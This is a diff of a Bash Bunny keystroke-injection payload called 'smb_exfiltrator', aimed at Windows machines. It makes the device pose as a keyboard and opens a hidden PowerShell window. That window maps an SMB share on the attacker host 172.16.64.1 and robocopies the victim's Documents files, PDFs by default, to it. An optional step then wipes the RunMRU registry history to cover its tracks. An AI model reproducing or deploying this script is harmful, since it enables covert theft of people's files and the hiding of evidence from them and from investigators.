@@ -6,8 +6,8 @@
 # Category:      Exfiltration
 # Target:        Windows XP SP3+ (Powershell)
 # Attackmodes:   HID, Ethernet
-# 
-# 
+#
+#
 # Red Blink Fast.......Impacket not found
 # Red Blink Slow.......Target did not acquire IP address
 # Amber Blink Fast.....Initialization
@@ -19,17 +19,25 @@
 #
 # OPTIONS
 LOOTDIR=/root/udisk/loot/smb_exfiltrator
-EXFILTRATE_FILES="*.pdf"
+FILES="*.pdf" # File types to be exfiltrated
 CLEARTRACKS="yes" # yes or no
 
 # Initialization
 LED R G 100
 
-
 # Check for impacket. If not found, blink fast red.
 if [ ! -d /pentest/impacket/ ]; then
   LED R 100
   exit 1
+fi
+
+# Define powershell payload
+PAYLOAD="While(!!(New-Object net.sockets.tcpclient (172.16.64.1,445))){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $FILES /S"
+
+# If cleartracks add the code to the powershell payload
+if [ $CLEARTRACKS == "yes" ]; then
+  PAYLOAD=${PAYLOAD%\"}
+  PAYLOAD="${PAYLOAD};rp HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -N '*'"
 fi
 
 
@@ -38,20 +46,12 @@ fi
 # Once found, initiates file copy and exits
 LED R G
 ATTACKMODE HID
+
+QUACK Delay 500
 QUACK GUI r
 QUACK DELAY 500
-QUACK STRING "powershell -WindowStyle Hidden \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; net use \\\172.16.64.1\e guest /USER:guest; robocopy \$ENV:UserProfile\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S; exit } }\""
+QUACK STRING "PowerShell -W Hidden \"${PAYLOAD}\""
 QUACK ENTER
-
-# Clear tracks?
-if [ $CLEARTRACKS == "yes" ]; then
-   QUACK DELAY 500
-   QUACK GUI r
-   QUACK DELAY 500
-   QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
-   QUACK ENTER
-fi
-
 
 # ETHERNET STAGE
 LED R B 100
@@ -101,7 +101,7 @@ while [ "$last" != "$current" ]; do
    sleep 1
    LED R B 100
    sleep 9
-   # Files are still being copied. Loop. 
+   # Files are still being copied. Loop.
    # (Issue may exist if file takes longer than 10s to copy)
 done
 
